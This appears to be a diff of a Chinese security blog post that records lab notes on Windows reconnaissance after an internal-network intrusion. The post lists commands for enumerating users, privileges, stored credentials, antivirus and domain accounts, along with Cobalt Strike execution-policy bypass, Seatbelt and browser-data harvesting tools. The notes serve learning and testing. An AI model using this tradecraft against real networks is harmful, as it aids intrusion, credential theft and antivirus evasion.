@@ -5,7 +5,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="内网渗透学习-Windows信息搜集篇-持续更新, hybcx&#39;s blog">
-    <meta name="description" content="">
+    <meta name="description" content="当我们通过渗透进入内网环境后，面对的是一片未知区域。需要对当前机器角色判断，对机器所处区域分析。
+判断机器所处于网络拓扑哪个区域，是在DMZ区、办公区、核心区。区域界限是相对的
+0x01 机器角色判断
+
+文件服务器：配合社工，生成paylo">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,27 +17,48 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
     <title>内网渗透学习-Windows信息搜集篇-持续更新 | hybcx&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
+    
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+    <!-- bg-cover style     -->
 
-<meta name="generator" content="Hexo 6.3.0">
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 
 
 <body>
@@ -45,7 +70,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">hybcx&#39;s blog</span>
+                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                 </a>
             </div>
             
@@ -135,6 +160,11 @@
       <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
     </a>
   </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
 </ul>
 
 
@@ -151,8 +181,6 @@
             
         </div>
     </div>
-
-    
 
     <ul class="menu-list mobile-menu-list">
         
@@ -330,99 +358,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        padding: 35px 0 15px 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        padding-bottom: 30px;
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-
-        position: absolute;
-        right: 23.5vw;
-        display: block;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
+    <div class="row">
     <div id="main-content" class="col s12 m12 l9">
         <!-- 文章内容详情 -->
 <div id="artDetail">
@@ -463,12 +399,32 @@
                 
 
                 
-
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-09-10
+                </div>
                 
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    5.9k
+                </div>
+                
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    25 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
             </div>
         </div>
         <hr class="clearfix">
@@ -501,141 +457,141 @@
 </ul>
 <h3 id="2-1-查看主机名">2.1 查看主机名</h3>
 <p><code>hostname</code></p>
-<p><img src="image-20230904213133038.png" alt="image-20230904213133038"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904213133038.png" alt="image-20230904213133038"></p>
 <h3 id="2-2-查看版本">2.2 查看版本</h3>
 <p><code>ver</code></p>
-<p><img src="image-20230904213228806.png" alt="image-20230904213228806"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904213228806.png" alt="image-20230904213228806"></p>
 <h3 id="2-3-查看所有环境变量">2.3 查看所有环境变量</h3>
 <p><code>set</code></p>
-<p><img src="image-20230904214436820.png" alt="image-20230904214436820"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904214436820.png" alt="image-20230904214436820"></p>
 <h3 id="2-4-查看安装驱动">2.4 查看安装驱动</h3>
 <p><code>DRIVERQUERY</code></p>
-<p><img src="image-20230904214716930.png" alt="image-20230904214716930"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904214716930.png" alt="image-20230904214716930"></p>
 <h3 id="2-5-查看操作系统信息">2.5 查看操作系统信息</h3>
 <h4 id="2-5-1-架构">2.5.1 架构</h4>
 <p><code>wmic os get osarchitecture</code></p>
-<p><img src="image-20230904214754849.png" alt="image-20230904214754849"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904214754849.png" alt="image-20230904214754849"></p>
 <h4 id="2-5-2-系统名">2.5.2 系统名</h4>
 <p><code>wmic os get caption</code></p>
-<p><img src="image-20230904214801657.png" alt="image-20230904214801657"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904214801657.png" alt="image-20230904214801657"></p>
 <h3 id="2-6-查看逻辑盘">2.6 查看逻辑盘</h3>
 <p><code>wmic logicaldisk get caption</code></p>
-<p><img src="image-20230904214847677.png" alt="image-20230904214847677"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904214847677.png" alt="image-20230904214847677"></p>
 <h3 id="2-7-本机网络配置">2.7 本机网络配置</h3>
 <p><code>ipconfig /all - ip地址信息</code></p>
-<p><img src="image-20230904184627149.png" alt="image-20230904184627149"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904184627149.png" alt="image-20230904184627149"></p>
 <p><code>netstat -ano - 端口信息</code></p>
-<p><img src="image-20230904184725197.png" alt="image-20230904184725197"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904184725197.png" alt="image-20230904184725197"></p>
 <p><code>arp -a - arp记录信息</code></p>
-<p><img src="image-20230904184855347.png" alt="image-20230904184855347"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904184855347.png" alt="image-20230904184855347"></p>
 <h3 id="2-8-查看当前系统版本">2.8 查看当前系统版本</h3>
 <h4 id="tip：wmic命令">tip：wmic命令</h4>
 <p>顺便了解一下wmic命令作用</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WMIC（Windows Management Instrumentation Command-line）是Windows操作系统中的一个命令行实用程序，用于执行各种系统管理任务和查询系统信息。通过WMIC，用户可以在命令行中执行各种WMI（Windows Management Instrumentation）操作，包括查询系统信息、管理进程、服务、网络设置等。 WMIC提供了丰富的命令<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">WMIC（Windows Management Instrumentation Command-line）是Windows操作系统中的一个命令行实用程序，用于执行各种系统管理任务和查询系统信息。通过WMIC，用户可以在命令行中执行各种WMI（Windows Management Instrumentation）操作，包括查询系统信息、管理进程、服务、网络设置等。 WMIC提供了丰富的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><code>wmic OS get Caption,CSDVersion,OSArchitecture,Version</code></p>
-<p><img src="image-20230904185053443.png" alt="image-20230904185053443"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904185053443.png" alt="image-20230904185053443"></p>
 <h3 id="2-9-查看体系结构">2.9 查看体系结构</h3>
 <p><code>echo %PROCESSOR_ARCHITECTURE%</code></p>
-<p><img src="image-20230904185257979.png" alt="image-20230904185257979"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904185257979.png" alt="image-20230904185257979"></p>
 <h3 id="2-10-查询操作系统及软件信息">2.10 查询操作系统及软件信息</h3>
 <p><code>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" ## 英文系统</code><br>
 <code>systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本" ## 中文系统</code></p>
-<p><img src="image-20230904185818019.png" alt="image-20230904185818019"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904185818019.png" alt="image-20230904185818019"></p>
 <p>这里不知为何打不开，找了几篇文章，感觉是环境变量的问题，设置了之后又发现语法错误，双引号是中文版的。。。，好在最后成功了，且为中文系统</p>
-<p><img src="image-20230904191114509.png" alt="image-20230904191114509"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904191114509.png" alt="image-20230904191114509"></p>
 <h3 id="2-11-查看-net-framework版本">2.11 <a target="_blank" rel="noopener" href="http://xn--jvv205a.net">查看.net</a> framework版本</h3>
 <p><code>reg query "HKLM\Software\Microsoft\NET Framework Setup\NDP" /s /v version | findstr /i version | sort /+26 /r</code></p>
-<p><img src="image-20230904191245270.png" alt="image-20230904191245270"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904191245270.png" alt="image-20230904191245270"></p>
 <h3 id="2-12-查看补丁列表">2.12 查看补丁列表</h3>
 <p><code>systeminfo</code></p>
-<p><img src="image-20230904191328746.png" alt="image-20230904191328746"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904191328746.png" alt="image-20230904191328746"></p>
 <h3 id="2-13-查看补丁的名称、描述、ID、安装时间等">2.13 查看补丁的名称、描述、ID、安装时间等</h3>
 <p><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p>
-<p><img src="image-20230904191657172.png" alt="image-20230904191657172"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904191657172.png" alt="image-20230904191657172"></p>
 <h3 id="2-14-PowerShell收集软件的版本信息">2.14 PowerShell收集软件的版本信息</h3>
 <p><code>powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name, version"</code></p>
-<p><img src="image-20230904191734197.png" alt="image-20230904191734197"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904191734197.png" alt="image-20230904191734197"></p>
 <h3 id="2-15-查看安装的软件的版本、路径等">2.15 查看安装的软件的版本、路径等</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic product get name, version<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230904192209137.png" alt="image-20230904192209137"></p>
+<pre class="line-numbers language-none"><code class="language-none">wmic product get name, version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904192209137.png" alt="image-20230904192209137"></p>
 <p>查看软件比较靠谱的做法是远程加载本地ps文件，cs中可以使用powershell-import,上传ListInstallProgram.ps1后输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell Get-list<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">powershell Get-list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>将文件放到靶机，本地加载也可以</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">shell powershell -exec bypass -Command "&amp; {Import-Module 'C:\Users\HackerQWQ\Desktop\ListInstalledProgram.ps1';Get-list}"<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">shell powershell -exec bypass -Command "&amp; {Import-Module 'C:\Users\HackerQWQ\Desktop\ListInstalledProgram.ps1';Get-list}"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里尝试了半天，不知道从哪下手，还是对cs不熟悉，之后深入学习慢慢搞</p>
 <h3 id="2-16-查看当前用户权限">2.16 查看当前用户权限</h3>
 <p><code>whoami &amp;&amp; whoami /priv</code></p>
-<p><img src="image-20230904210854189.png" alt="image-20230904210854189"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904210854189.png" alt="image-20230904210854189"></p>
 <h3 id="2-17-查询本机服务信息">2.17 查询本机服务信息</h3>
 <p><code>wmic service list brief</code></p>
-<p><img src="image-20230904210935433.png" alt="image-20230904210935433"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904210935433.png" alt="image-20230904210935433"></p>
 <h3 id="2-18-查看开启的服务">2.18 查看开启的服务</h3>
 <p><code>net start</code></p>
-<p><img src="image-20230904210950915.png" alt="image-20230904210950915"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904210950915.png" alt="image-20230904210950915"></p>
 <h3 id="2-19-wmic查询进程信息">2.19 wmic查询进程信息</h3>
 <p><code>wmic process list brief</code></p>
-<p><img src="image-20230904211011968.png" alt="image-20230904211011968"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211011968.png" alt="image-20230904211011968"></p>
 <h3 id="2-20-查看进程">2.20 查看进程</h3>
 <p><code>tasklist /svc</code></p>
-<p><img src="image-20230904211034249.png" alt="image-20230904211034249"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211034249.png" alt="image-20230904211034249"></p>
 <h3 id="2-21-查看启动程序信息">2.21 查看启动程序信息</h3>
 <p><code>wmic startup get command,caption</code></p>
-<p><img src="image-20230904211052427.png" alt="image-20230904211052427"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211052427.png" alt="image-20230904211052427"></p>
 <h3 id="2-22-查看计划任务-需要高权限">2.22 查看计划任务(需要高权限)</h3>
 <p><code>at（win10之前）</code><br>
 <code>chtasks /query /fo LIST /v（win10之后）</code></p>
-<p><img src="image-20230904211208228.png" alt="image-20230904211208228"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211208228.png" alt="image-20230904211208228"></p>
 <h3 id="2-23-查看主机开机时间">2.23 查看主机开机时间</h3>
 <p><code>net statistics workstation</code></p>
-<p><img src="image-20230904211242395.png" alt="image-20230904211242395"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211242395.png" alt="image-20230904211242395"></p>
 <h3 id="2-24-查看本机用户列表">2.24 查看本机用户列表</h3>
 <p><code>net user</code></p>
-<p><img src="image-20230904211256931.png" alt="image-20230904211256931"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211256931.png" alt="image-20230904211256931"></p>
 <h3 id="2-25-获取本地管理员信息">2.25 获取本地管理员信息</h3>
 <p><code>net localgroup administrators</code></p>
-<p><img src="image-20230904211358193.png" alt="image-20230904211358193"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211358193.png" alt="image-20230904211358193"></p>
 <h3 id="2-26-查看当前在线用户">2.26 查看当前在线用户</h3>
 <p><code>query user || qwinsta</code></p>
-<p><img src="image-20230904211418778.png" alt="image-20230904211418778"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211418778.png" alt="image-20230904211418778"></p>
 <h3 id="2-27-查看在线用户">2.27 查看在线用户</h3>
 <p><code>quser</code></p>
-<p><img src="image-20230904211427997.png" alt="image-20230904211427997"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211427997.png" alt="image-20230904211427997"></p>
 <h3 id="2-28-列出断开本地计算机与所连接的客户端的对话-需要高权限">2.28 列出断开本地计算机与所连接的客户端的对话(需要高权限)</h3>
 <p><code>net session</code></p>
-<p><img src="image-20230904211530179.png" alt="image-20230904211530179"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211530179.png" alt="image-20230904211530179"></p>
 <h3 id="2-29-查询端口列表">2.29 查询端口列表</h3>
 <p><code>Windows: netstat -ano</code><br>
 <code>linux: netstat -tnlp</code></p>
-<p><img src="image-20230904211553775.png" alt="image-20230904211553775"></p>
-<p><img src="image-20230904211619090.png" alt="image-20230904211619090"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211553775.png" alt="image-20230904211553775"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211619090.png" alt="image-20230904211619090"></p>
 <h3 id="2-30-查看本机共享列表和可访问的域共享列表">2.30 查看本机共享列表和可访问的域共享列表</h3>
 <p><code>net share （445端口）</code></p>
-<p><img src="image-20230904211638834.png" alt="image-20230904211638834"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211638834.png" alt="image-20230904211638834"></p>
 <h3 id="2-31-查找共享列表">2.31 查找共享列表</h3>
 <p><code>wmic share get name,path,status</code></p>
-<p><img src="image-20230904211654136.png" alt="image-20230904211654136"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904211654136.png" alt="image-20230904211654136"></p>
 <h3 id="2-32-磁盘映射">2.32 磁盘映射</h3>
 <p><code>net use k: \192.168.1.10\c$</code></p>
 <p>这里不太懂，没搞出来</p>
 <h3 id="2-33-查询路由表">2.33 查询路由表</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">route print<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230904212407238.png" alt="image-20230904212407238"></p>
+<pre class="line-numbers language-none"><code class="language-none">route print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904212407238.png" alt="image-20230904212407238"></p>
 <p>可用接口的ARP缓存表。局域网内arp -a，查看是否有重复的mac地址，判断是否存在arp欺骗。服务器绑定mac地址方式防止arp欺骗</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">arp -a<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230904212555006.png" alt="image-20230904212555006"></p>
+<pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904212555006.png" alt="image-20230904212555006"></p>
 <h3 id="2-34-查看远程连接信息">2.34 查看远程连接信息</h3>
 <p><code>cmdkey /l</code></p>
-<p><img src="image-20230904212709052.png" alt="image-20230904212709052"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904212709052.png" alt="image-20230904212709052"></p>
 <h3 id="2-35-查看杀软">2.35 查看杀软</h3>
 <p><code>WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code></p>
 <p>暂时没有</p>
 <h3 id="2-36-查看本地密码策略">2.36 查看本地密码策略</h3>
 <p><code>net accounts</code></p>
-<p><img src="image-20230904214925560.png" alt="image-20230904214925560"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904214925560.png" alt="image-20230904214925560"></p>
 <h3 id="2-37-查看hosts文件：">2.37 查看hosts文件：</h3>
 <p><code>linux:cat /etc/hosts</code><br>
 <code>windows:type c:\Windows\system32\drivers\etc\hosts</code></p>
-<p><img src="image-20230904214950300.png" alt="image-20230904214950300"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904214950300.png" alt="image-20230904214950300"></p>
 <h3 id="2-38-查看dns缓存">2.38 查看dns缓存</h3>
 <p><code>ipconfig /displaydns</code></p>
 <ul>
@@ -649,13 +605,13 @@
 <p>项目地址：<a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
 </li>
 </ul>
-<p><img src="image-20230904215134630.png" alt="image-20230904215134630"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904215134630.png" alt="image-20230904215134630"></p>
 <p>获取主机信息也可以用Seatbelt.exe，项目地址：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt/tree/master%EF%BC%8C%E9%9C%80%E8%A6%81%E7%BC%96%E8%AF%91%EF%BC%8C%E6%94%BE%E5%88%B0%E9%9D%B6%E6%9C%BA%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%B8%8B%E5%88%97%E5%91%BD%E4%BB%A4">https://github.com/GhostPack/Seatbelt/tree/master，需要编译，放到靶机上执行下列命令</a></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">shell Seatbelt.exe -group=all &gt; env.txt<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">shell Seatbelt.exe -group=all &gt; env.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>最好先<code>免杀一下</code>，不然360会一直警告,cs上的插件也有集成Seatbelt，可以直接使用插件   --这里等学了免杀在搞吧</p>
-<p><img src="image-20230904215159103.png" alt="image-20230904215159103"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230904215159103.png" alt="image-20230904215159103"></p>
 <h3 id="2-39-常见查毒软件进程">2.39 常见查毒软件进程</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tasklist /svc<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">tasklist /svc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>随后将结果放到avList中对比查看</p>
 <table>
 <thead>
@@ -708,109 +664,118 @@
 </tbody>
 </table>
 <p>可以用avList自动判断,项目地址:<a target="_blank" rel="noopener" href="https://github.com/gh0stkey/avList">https://github.com/gh0stkey/avList</a></p>
-<p><img src="image-20230905164342620.png" alt="image-20230905164342620"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230905164342620.png" alt="image-20230905164342620"></p>
 <h3 id="2-40-浏览器信息收集">2.40 浏览器信息收集</h3>
 <p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
-<p><img src="image-20230905164434895.png" alt="image-20230905164434895"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230905164434895.png" alt="image-20230905164434895"></p>
 <h2 id="0x03-域环境信息收集">0x03 域环境信息收集</h2>
 <h3 id="3-1-判断是否存在域">3.1 判断是否存在域</h3>
 <p><code>ipconfig /all</code> 可查看网关IP地址、DNS的IP地址、域名、本机是否和DNS服务器处在同一网段等。</p>
-<p><img src="image-20230907203316781.png" alt="image-20230907203316781"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230907203316781.png" alt="image-20230907203316781"></p>
 <h3 id="3-2-解析域名ip">3.2 解析域名ip</h3>
 <p>通过反向解析查询命令<code>nslookup</code>来解析域名的IP地址，用解析到的IP地址进行对比，判断域控服务器和DNS服务器是否在同一台机器上</p>
 <p><code>nslookup hacker.testlab(这里写自己的域控制服务器域名)</code></p>
-<p><img src="image-20230907203351564.png" alt="image-20230907203351564"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230907203351564.png" alt="image-20230907203351564"></p>
 <h3 id="3-3-查看当前权限">3.3 查看当前权限</h3>
 <p><code>whoami</code></p>
-<p><img src="image-20230907203359645.png" alt="image-20230907203359645"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230907203359645.png" alt="image-20230907203359645"></p>
 <h3 id="3-4-获取域SID">3.4 获取域SID</h3>
 <p><code>whoami /all</code></p>
-<p><img src="image-20230905165730621.png" alt="image-20230905165730621"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230905165730621.png" alt="image-20230905165730621"></p>
 <h3 id="3-5-查询指定用户的详情信息">3.5 查询指定用户的详情信息</h3>
 <p><code>net user xxx /domain</code></p>
-<p><img src="image-20230909144644670.png" alt="image-20230909144644670"></p>
+<p><img src="/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/image-20230909144644670.png" alt="image-20230909144644670"></p>
 <h3 id="3-6-查看域内所有账号">3.6 查看域内所有账号</h3>
 <p><code>net user /domain</code></p>
-<p><img src="image-20230909144558243.png" alt="image-20230909144558243"></p>
